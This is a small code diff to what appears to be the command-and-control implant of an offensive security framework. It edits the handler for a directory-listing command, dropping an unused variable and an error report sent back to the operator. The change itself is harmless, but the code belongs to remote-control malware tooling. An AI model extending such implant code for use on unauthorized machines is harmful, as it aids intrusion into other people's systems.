@@ -688,7 +688,6 @@ VOID CommandFS( PPARSER Parser )
     {
         case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )
         {
-            WIN32_FIND_DATAW FindData     = { 0 };
             LPWSTR           TargetFolder = NULL;
             LPWSTR           Path         = NULL;
             BOOL             FileExplorer = FALSE;
@@ -725,7 +724,6 @@ VOID CommandFS( PPARSER Parser )
                 if ( ! Instance.Win32.GetCurrentDirectoryW( MAX_PATH, Path ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
-                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );
                     break;
                 }
